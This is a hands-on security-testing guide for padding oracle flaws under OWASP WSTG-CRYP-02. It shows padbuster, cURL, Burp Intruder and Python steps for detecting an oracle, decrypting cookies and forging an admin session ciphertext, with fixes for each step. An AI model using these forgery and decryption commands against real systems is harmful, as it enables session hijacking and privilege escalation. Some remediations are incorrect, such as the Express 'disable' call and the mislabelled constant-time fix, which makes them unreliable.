# Testing for Padding Oracle

## Overview

Testing for Padding Oracle (WSTG-CRYP-02) involves assessing web applications for vulnerabilities in block cipher padding schemes, particularly in CBC mode, that allow attackers to decrypt sensitive data or forge ciphertexts without the encryption key. According to OWASP, padding oracle vulnerabilities occur when a server inadvertently reveals whether padding in a modified ciphertext is valid through distinct error messages, status codes, or response times. This enables attackers to perform byte-by-byte decryption of encrypted data (e.g., session tokens, API parameters) or create valid ciphertexts, compromising confidentiality and integrity. This test focuses on identifying encrypted data, manipulating ciphertexts, and analyzing server responses to detect padding oracles.

**Impact**: Padding oracle vulnerabilities can lead to:
- Unauthorized decryption of sensitive data (e.g., user credentials, session IDs).
- Forgery of encrypted messages, bypassing authentication or authorization.
- Exposure of encrypted data in cookies, form fields, or API payloads.
- Escalation of attacks by chaining with other vulnerabilities (e.g., session hijacking).

This guide provides a practical, hands-on methodology for testing padding oracle vulnerabilities, adhering to OWASP’s WSTG-CRYP-02, with detailed tool setups, specific commands integrated into test steps, remediation strategies, and ethical considerations for professional penetration testing.

## Testing Tools

The following tools are recommended for testing padding oracle vulnerabilities, with setup and configuration instructions:

- **padbuster**: Automates padding oracle attacks to decrypt or forge ciphertexts.
  - Install on Linux:
    ```bash
    sudo apt install padbuster
    ```
  - Or download from [GitHub](https://github.com/GDSSecurity/Padbuster).
  - Install Perl (dependency):
    ```bash
    sudo apt install perl
    ```

- **Burp Suite Community Edition**: Intercepts and manipulates HTTP requests to test ciphertext responses.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
  - Enable “Intercept” in Proxy tab.

- **cURL**: Sends modified ciphertexts to observe server behavior.
  - Install on Linux:
    ```bash
    sudo apt install curl
    ```
  - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).

- **Postman**: Tests API endpoints with manipulated encrypted parameters.
  - Download from [postman.com](https://www.postman.com/downloads/).
  - Install and create a free account.

- **Python Requests Library**: Scripts automated tests for padding oracle detection.
  - Install Python:
    ```bash
    sudo apt install python3
    ```
  - Install Requests:
    ```bash
    pip install requests
    ```

## Testing Methodology

This methodology follows OWASP’s black-box approach for WSTG-CRYP-02, focusing on identifying encrypted data, manipulating ciphertexts, and analyzing server responses to detect padding oracle vulnerabilities.

### 1. Identify Encrypted Data with Burp Suite

**Objective**: Locate components containing encrypted data (e.g., cookies, URL parameters, form fields, API payloads) that may be vulnerable to padding oracle attacks.

**Steps**:
1. **Configure Burp Suite**:
   - Set up browser proxy (127.0.0.1:8080).
   - Add `example.com` to the target scope in the “Target” tab.
2. **Capture Requests**:
   - Browse the application or interact with APIs to capture requests in “HTTP History”.
   - Look for base64-encoded or hex strings in cookies (e.g., `session=abc123encrypted`), URL parameters (e.g., `?token=xyz`), or POST data.
3. **Analyze Data**:
   - Identify potential encrypted data by length (multiples of block size, e.g., 16 bytes for AES) or encoding (e.g., base64).
   - Note endpoints that process these values (e.g., `/api/auth`, `/profile`).

**Burp Suite Commands**:
- **Command 1**: Capture and inspect a cookie:
  ```
  HTTP History -> Select GET /profile -> Check Request Headers for Cookie: session=abc123encrypted -> Copy value to Repeater
  ```
- **Command 2**: Test URL parameter:
  ```
  HTTP History -> Select GET /auth?token=xyz -> Send to Repeater -> Highlight token value for manipulation
  ```

**Example Encrypted Cookie**:
```
GET /profile HTTP/1.1
Host: example.com
Cookie: session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n
```

**Remediation**:
- Use authenticated encryption (Python):
  ```python
  from cryptography.hazmat.primitives.ciphers.aead import AESGCM
  key = AESGCM.generate_key(bit_length=128)
  aesgcm = AESGCM(key)
  ciphertext = aesgcm.encrypt(nonce, data, associated_data)
  ```

**Tip**: Save requests with encrypted data in Burp Suite’s “Logger” or as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP requests).

### 2. Test for Padding Oracle with padbuster

**Objective**: Automate padding oracle attacks to confirm vulnerabilities and potentially decrypt ciphertexts.

**Steps**:
1. **Identify Encrypted Value**:
   - Extract an encrypted value (e.g., base64-encoded cookie) from Burp Suite.
   - Ensure the value is a multiple of the block size (e.g., 16 bytes for AES).
2. **Run padbuster**:
   - Test the endpoint for padding oracle behavior by manipulating the ciphertext.
   - Specify the block size (typically 8 or 16 bytes) and encoding.
3. **Analyze Output**:
   - Check if padbuster identifies distinct responses (e.g., HTTP 200 vs. 403) for valid/invalid padding.
   - Note any decrypted data.

**padbuster Commands**:
- **Command 1**: Test for padding oracle in a cookie:
  ```bash
  padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0
  ```
- **Command 2**: Attempt decryption:
  ```bash
  padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0 -plaintext "test"
  ```

**Example Vulnerable Output**:
```
INFO: Valid padding found for block 1
Decrypted value: {"user_id": 123}
```

**Remediation**:
- Use GCM mode instead of CBC (Python):
  ```python
  from cryptography.hazmat.primitives.ciphers.aead import AESGCM
  aesgcm = AESGCM(key)
  ciphertext = aesgcm.encrypt(nonce, plaintext, None)
  ```

**Tip**: Save padbuster output to a file (e.g., `padbuster ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., decrypted data).

### 3. Manipulate Ciphertexts with cURL

**Objective**: Manually test for padding oracle by altering ciphertexts and observing server responses.

**Steps**:
1. **Extract Ciphertext**:
   - Copy an encrypted value (e.g., `token=xyz`) from Burp Suite.
2. **Modify Ciphertext**:
   - Alter a single byte (e.g., change one character in base64) and send the request.
   - Test multiple variations to identify response differences.
3. **Analyze Response**:
   - Check for distinct HTTP status codes (e.g., 200 vs. 403), error messages (e.g., `Invalid padding`), or content differences.

**cURL Commands**:
- **Command 1**: Test original ciphertext:
  ```bash
  curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" http://example.com/profile
  ```
- **Command 2**: Test modified ciphertext:
  ```bash
  curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0o" http://example.com/profile
  ```

**Example Vulnerable Response**:
- Original: `HTTP/1.1 200 OK`
- Modified: `HTTP/1.1 403 Forbidden: Invalid padding`

**Remediation**:
- Ensure consistent error messages (Node.js):
  ```javascript
  app.use((err, req, res, next) => {
      res.status(400).json({ error: 'Invalid request' });
  });
  ```

**Tip**: Save cURL responses to a file (e.g., `curl -i ... > response.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 4. Test API Endpoints with Postman

**Objective**: Test API endpoints processing encrypted data for padding oracle vulnerabilities.

**Steps**:
1. **Identify API Endpoint**:
   - Use Burp Suite to find endpoints (e.g., `POST /api/auth`).
   - Import into Postman.
2. **Manipulate Encrypted Parameters**:
   - Alter encrypted values in request bodies or headers.
   - Send multiple variations.
3. **Analyze Response**:
   - Check for distinct error messages, status codes, or content differences indicating padding validity.

**Postman Commands**:
- **Command 1**: Send original encrypted token:
  ```
  New Request -> POST http://example.com/api/auth -> Body -> raw -> JSON: {"token": "5a8b9c0d1e2f3g4h5i6j7k8l9m0n"} -> Send
  ```
- **Command 2**: Send modified token:
  ```
  New Request -> POST http://example.com/api/auth -> Body -> raw -> JSON: {"token": "5a8b9c0d1e2f3g4h5i6j7k8l9m0o"} -> Send
  ```

**Example Vulnerable Response**:
```json
{
  "error": "Invalid padding in token"
}
```

**Remediation**:
- Use integrity checks (Python):
  ```python
  from cryptography.hazmat.primitives.hmac import HMAC
  from cryptography.hazmat.primitives.hashes import SHA256
  hmac = HMAC(key, SHA256())
  hmac.update(ciphertext)
  hmac.verify(signature)
  ```

**Tip**: Save Postman requests and responses as exports or screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., API responses).

### 5. Automate Testing with Python Requests

**Objective**: Script automated tests to detect padding oracle vulnerabilities by analyzing response differences.

**Steps**:
1. **Write Python Script**:
   - Create a script to send modified ciphertexts and compare responses.
2. **Run Script**:
   - Execute the script to test for status code or content differences.
3. **Analyze Output**:
   - Identify potential padding oracles if responses differ significantly.

**Python Script**:
```python
import requests
import base64
import sys

url = 'http://example.com/profile'
original_session = '5a8b9c0d1e2f3g4h5i6j7k8l9m0n'
headers = {'Cookie': f'session={original_session}'}

try:
    # Send original request
    original_response = requests.get(url, headers=headers, timeout=5)
    
    # Modify one byte
    modified_session = base64.b64decode(original_session)
    modified_session = bytearray(modified_session)
    modified_session[-1] ^= 0x01
    modified_session = base64.b64encode(modified_session).decode()
    modified_headers = {'Cookie': f'session={modified_session}'}
    modified_response = requests.get(url, headers=modified_headers, timeout=5)
    
    # Compare responses
    print(f"Original: Status={original_response.status_code}, Content={original_response.text[:100]}")
    print(f"Modified: Status={modified_response.status_code}, Content={modified_response.text[:100]}")
    if original_response.status_code != modified_response.status_code or original_response.text != modified_response.text:
        print("Potential padding oracle detected!")
except requests.RequestException as e:
    print(f"Error: {e}")
    sys.exit(1)
```

**Python Commands**:
- **Command 1**: Run the padding oracle test:
  ```bash
  python3 test_padding_oracle.py
  ```
- **Command 2**: Test modified ciphertext:
  ```bash
  python3 -c "import requests; url='http://example.com/profile'; headers={'Cookie': 'session=5a8b9c0d1e2f3g4h5i6j7k8l9m0o'}; r=requests.get(url, headers=headers, timeout=5); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Original: Status=200, Content={"user_id": 123}
Modified: Status=403, Content={"error": "Invalid padding"}
Potential padding oracle detected!
```

**Remediation**:
- Avoid CBC mode (Python):
  ```python
  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
  cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
  encryptor = cipher.encryptor()
  ciphertext = encryptor.update(data) + encryptor.finalize()
  ```

**Tip**: Save script output to a file (e.g., `python3 test_padding_oracle.py > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., script output).

### 6. Test Response Timing Differences

**Objective**: Detect timing-based padding oracles by measuring response times for valid vs. invalid padding.

**Steps**:
1. **Send Requests**:
   - Use Python to send original and modified ciphertexts.
   - Measure response times for each request.
2. **Analyze Timing**:
   - Compare response times; significant differences (e.g., >100ms) suggest a padding oracle.
3. **Verify Findings**:
   - Cross-check with Burp Suite for manual confirmation.

**Python Script**:
```python
import requests
import time
import base64
import sys

url = 'http://example.com/profile'
original_session = '5a8b9c0d1e2f3g4h5i6j7k8l9m0n'
headers = {'Cookie': f'session={original_session}'}

try:
    # Send original request
    start = time.time()
    r1 = requests.get(url, headers=headers, timeout=5)
    t1 = time.time() - start
    
    # Modify one byte
    modified_session = base64.b64decode(original_session)
    modified_session = bytearray(modified_session)
    modified_session[-1] ^= 0x01
    modified_session = base64.b64encode(modified_session).decode()
    modified_headers = {'Cookie': f'session={modified_session}'}
    start = time.time()
    r2 = requests.get(url, headers=modified_headers, timeout=5)
    t2 = time.time() - start
    
    print(f"Original: {t1:.3f}s, Modified: {t2:.3f}s")
    if abs(t1 - t2) > 0.1:
        print("Potential timing-based padding oracle detected!")
except requests.RequestException as e:
    print(f"Error: {e}")
    sys.exit(1)
```

**Python Commands**:
- **Command 1**: Run the timing test:
  ```bash
  python3 test_timing_oracle.py
  ```
- **Command 2**: Measure timing with cURL:
  ```bash
  curl -i -b "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" --write-out "%{time_total}\n" http://example.com/profile
  ```

**Example Vulnerable Output**:
```
Original: 0.050s, Modified: 0.200s
Potential timing-based padding oracle detected!
```

**Remediation**:
- Use constant-time padding validation (Python):
  ```python
  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
  cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
  encryptor = cipher.encryptor()
  ciphertext = encryptor.update(data) + encryptor.finalize()
  ```

**Tip**: Save script or cURL output to a file (e.g., `python3 test_timing_oracle.py > timing.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., timing differences).

### 7. Test Hidden or Non-Standard Endpoints

**Objective**: Identify and test non-standard endpoints processing encrypted data for padding oracle vulnerabilities.

**Steps**:
1. **Enumerate Endpoints**:
   - Use Burp Suite’s Spider or Crawler to discover hidden endpoints (e.g., `/debug`, `/api/v1/legacy`).
2. **Identify Encrypted Parameters**:
   - Check for tokens or session IDs in requests to these endpoints.
3. **Test with Intruder**:
   - Send modified ciphertexts to test for padding oracles.
   - Analyze response differences (status codes, content).

**Burp Suite Commands**:
- **Command 1**: Crawl for hidden endpoints:
  ```
  Target -> Site map -> Right-click http://example.com -> Engagement tools -> Crawl -> Start Crawl -> Check Site map for new endpoints
  ```
- **Command 2**: Test endpoint with Intruder:
  ```
  Target -> Site map -> Select http://example.com/debug?token=xyz -> Send to Intruder -> Positions -> Set payload position to token=§xyz§ -> Payloads -> Strings (xyz, xyy) -> Start Attack -> Check Response Status/Content
  ```

**Example Vulnerable Output**:
```
Request (token=xyz): HTTP/1.1 200 OK
Request (token=xyy): HTTP/1.1 403 Forbidden
```

**Remediation**:
- Disable debug endpoints in production (Node.js):
  ```javascript
  if (process.env.NODE_ENV === 'production') {
      app.disable('/debug');
  }
  ```

**Tip**: Save Burp Suite crawl results and Intruder responses as screenshots or exports. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 8. Test Ciphertext Forgery

**Objective**: Exploit a padding oracle to forge a valid ciphertext (e.g., modifying a user ID) to demonstrate privilege escalation.

**Steps**:
1. **Confirm Padding Oracle**:
   - Use Test 2 (padbuster) to verify the vulnerability.
2. **Forge Ciphertext**:
   - Use `padbuster` to encrypt a crafted plaintext (e.g., `{"user_id": "admin"}`).
3. **Test Forged Ciphertext**:
   - Send the forged ciphertext to the target endpoint and verify acceptance.

**padbuster Commands**:
- **Command 1**: Forge a new ciphertext:
  ```bash
  padbuster http://example.com/profile 5a8b9c0d1e2f3g4h5i6j7k8l9m0n 16 -cookies "session=5a8b9c0d1e2f3g4h5i6j7k8l9m0n" -encoding 0 -plaintext '{"user_id": "admin"}'
  ```
- **Command 2**: Test forged ciphertext:
  ```bash
  curl -i -b "session=a1b2c3d4e5f6g7h8i9j0k1l2" http://example.com/profile
  ```

**Example Vulnerable Output**:
```
Forged ciphertext: a1b2c3d4e5f6g7h8i9j0k1l2
Response: HTTP/1.1 200 OK, {"role": "admin"}
```

**Remediation**:
- Use authenticated encryption (Python):
  ```python
  from cryptography.hazmat.primitives.ciphers.aead import AESGCM
  aesgcm = AESGCM(key)
  ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
  ```

**Tip**: Save padbuster output and cURL responses to a file (e.g., `padbuster ... > forgery.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., forged responses).
